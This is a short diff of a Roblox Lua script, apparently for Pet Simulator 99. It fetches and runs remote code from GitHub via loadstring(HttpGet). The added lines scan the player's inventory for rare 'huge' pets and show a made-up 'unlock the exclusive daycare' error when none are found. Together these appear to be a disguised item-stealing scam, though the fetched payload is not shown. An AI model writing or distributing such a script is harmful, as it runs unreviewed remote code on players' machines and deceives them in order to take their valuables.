@@ -5,7 +5,20 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/Diapolo69/ps99/main/l
 wait(0.5)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Diapolo69/ps99/main/poopoo.lua"))()
+local library = game.ReplicatedStorage.Library
+local save = require(library.Client.Save).Get().Inventory
 
+local foundHugePet = false
+
+for i, v in pairs(save.Pet) do
+    local id = v.id
+    local dir = require(library.Directory.Pets)[id]
+    
+    if dir and dir.huge then
+        foundHugePet = true
+        break
+    end
+end
 if not foundHugePet then
     local message = require(game.ReplicatedStorage.Library.Client.Message)
     message.Error("Woops! You need to unlock the exclusive daycare in order to make the script work!")
